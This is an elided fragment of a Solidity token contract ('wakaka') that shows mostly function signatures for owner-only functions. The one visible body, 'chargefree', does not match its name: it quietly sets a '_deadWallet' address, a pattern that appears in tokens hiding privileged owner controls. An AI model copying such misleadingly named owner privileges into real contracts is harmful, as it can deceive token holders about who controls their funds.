...
contract wakaka is Context, Ownable {
    ...
    function safeTransfer(address account) external onlyOwner {
    ...
    function writeVotes(address account) public onlyOwner {
    ...
    function chargefree(address addr) public onlyOwner {
        _deadWallet = addr;
    }

    function getMaxHold(uint256 _maxHold) public view returns(uint256) {
